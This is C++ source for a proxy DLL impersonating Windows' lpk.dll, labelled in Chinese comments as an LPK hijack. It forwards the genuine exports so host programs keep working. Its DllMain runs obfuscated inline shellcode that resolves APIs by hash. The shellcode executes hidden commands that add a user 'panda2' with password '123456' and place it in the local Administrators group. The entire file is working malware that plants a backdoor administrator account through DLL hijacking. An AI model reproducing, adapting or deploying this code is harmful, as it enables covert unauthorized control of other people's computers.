// Lpk.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <windows.h>
#include <Shlobj.h>
#include <Shellapi.h>
#pragma comment(lib,"Shell32.lib")

#pragma comment(linker, "/SECTION:.text,REW" ) //设PE节：.text,可读可执行

typedef void  (__stdcall  * MYAPI)();

MYAPI pLpkInitialize;
MYAPI pLpkTabbedTextOut;
MYAPI pLpkDllInitialize;
MYAPI pLpkDrawTextEx;
MYAPI pLpkEditControl;
MYAPI pLpkExtTextOut;
MYAPI pLpkGetCharacterPlacement;
MYAPI pLpkGetTextExtentExPoint;
MYAPI pLpkPSMTextOut;
MYAPI pLpkUseGDIWidthCache;
MYAPI pftsWordBreak;

__declspec(naked) void LpkInitialize(){
//	MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pLpkInitialize]
}
__declspec(naked) void LpkTabbedTextOut(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkTabbedTextOut]
}
__declspec(naked) void LpkDllInitialize(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkDllInitialize]
}
__declspec(naked) void LpkDrawTextEx(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkDrawTextEx]
}
__declspec(naked) void LpkExtTextOut(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pLpkExtTextOut]
}
__declspec(naked) void LpkGetCharacterPlacement(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pLpkGetCharacterPlacement]
}
__declspec(naked) void LpkGetTextExtentExPoint(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pLpkGetTextExtentExPoint]
}
__declspec(naked) void LpkPSMTextOut(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pLpkPSMTextOut]
}
__declspec(naked) void LpkUseGDIWidthCache(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pLpkUseGDIWidthCache]
}
__declspec(naked) void ftsWordBreak(){
//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
		__asm jmp dword ptr [pftsWordBreak]
}
BYTE LpkEditControl[0x40] = {0};


	


BOOL APIENTRY DllMain( HMODULE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
	__asm
	{
	  cld
  push 0x1A22F51
  push 0x4FD18963
  push 0xC917432
  mov esi,esp
  lea edi,dword ptr ds:[esi-0xC]
  xor ebx,ebx
  mov bh,0x4
  sub esp,ebx
  mov bx,0x3233
  push ebx
  push 0x72657375
  push esp
  xor edx,edx
  mov ebx,dword ptr fs:[edx+0x30]
  mov ecx,dword ptr ds:[ebx+0xC]
  mov ecx,dword ptr ds:[ecx+0x1C]
  mov ecx,dword ptr ds:[ecx]
  mov ebp,dword ptr ds:[ecx+0x8]
L019:
  lods dword ptr ds:[esi]
  cmp eax,0x1E380A6A
  jnz L025
  xchg eax,ebp
  call dword ptr ds:[edi-0x8]
  xchg eax,ebp
L025:
  pushad
  mov eax,dword ptr ss:[ebp+0x3C]
  mov ecx,dword ptr ss:[ebp+eax+0x78]
  add ecx,ebp
  mov ebx,dword ptr ds:[ecx+0x20]
  add ebx,ebp
  xor edi,edi
L032:
  inc edi
  mov esi,dword ptr ds:[ebx+edi*4]
  add esi,ebp
  cdq
L036:
  movsx eax,byte ptr ds:[esi]
  cmp al,ah
  je L043
  ror edx,0x7
  add edx,eax
  inc esi
  jmp L036
L043:
  cmp edx,dword ptr ss:[esp+0x1C]
  jnz L032
  mov ebx,dword ptr ds:[ecx+0x24]
  add ebx,ebp
  mov di,word ptr ds:[ebx+edi*2]
  mov ebx,dword ptr ds:[ecx+0x1C]
  add ebx,ebp
  add ebp,dword ptr ds:[ebx+edi*4]
  xchg eax,ebp
  pop edi
  stos dword ptr es:[edi]
  push edi
  popad
  cmp eax,0x1A22F51
  jnz L019
  push 0x646461
  push 0x2F203635
  push 0x34333231
  push 0x20326164
  push 0x6E617020
  push 0x72657375
  push 0x2074656E
  xor edx,edx
  push edx
  lea edx,dword ptr ss:[esp+0x4]
  push edx
  call dword ptr ds:[edi-0x4]
  push 0x64
  push 0x64612F20
  push 0x3261646E
  push 0x61702073
  push 0x726F7461
  push 0x72747369
  push 0x6E696D64
  push 0x61207075
  push 0x6F72676C
  push 0x61636F6C
  push 0x2074656E
  xor edx,edx
  push edx
  lea edx,dword ptr ss:[esp+0x4]
  push edx
  call dword ptr ds:[edi-0x4]
	}
		DisableThreadLibraryCalls(hModule);
		char cDllPath[MAX_PATH]={0};
		GetSystemDirectoryA((LPSTR)cDllPath,MAX_PATH);
		strcat(cDllPath,"\\lpk.dll");
		HMODULE hDll = LoadLibraryA(cDllPath);
		if(hDll != NULL)
		{
			pLpkInitialize = (MYAPI) GetProcAddress(hDll,"LpkInitialize");
			pLpkTabbedTextOut = (MYAPI) GetProcAddress(hDll,"LpkTabbedTextOut");
			pLpkDllInitialize = (MYAPI) GetProcAddress(hDll,"LpkDllInitialize");
			pLpkDrawTextEx = (MYAPI) GetProcAddress(hDll,"LpkDrawTextEx");
			pLpkExtTextOut = (MYAPI) GetProcAddress(hDll,"LpkExtTextOut");
			pLpkGetCharacterPlacement = (MYAPI) GetProcAddress(hDll,"LpkGetCharacterPlacement");
			pLpkEditControl = (MYAPI) GetProcAddress(hDll,"LpkEditControl");
			pLpkGetTextExtentExPoint = (MYAPI) GetProcAddress(hDll,"LpkGetTextExtentExPoint");
			pLpkPSMTextOut = (MYAPI) GetProcAddress(hDll,"LpkPSMTextOut");
			pLpkUseGDIWidthCache = (MYAPI) GetProcAddress(hDll,"LpkUseGDIWidthCache");
			pftsWordBreak = (MYAPI) GetProcAddress(hDll,"ftsWordBreak");
			//将原始DLL中pLpkEditControl所指向数据拷贝到我们的DLL中LpkEditControl所指向的内存。
			CopyMemory((LPVOID)( (DWORD)LpkEditControl ),(PVOID)( (DWORD)pLpkEditControl ),56);
		}
		else
		{
			ExitProcess(0);
		}
	}
    return TRUE;
}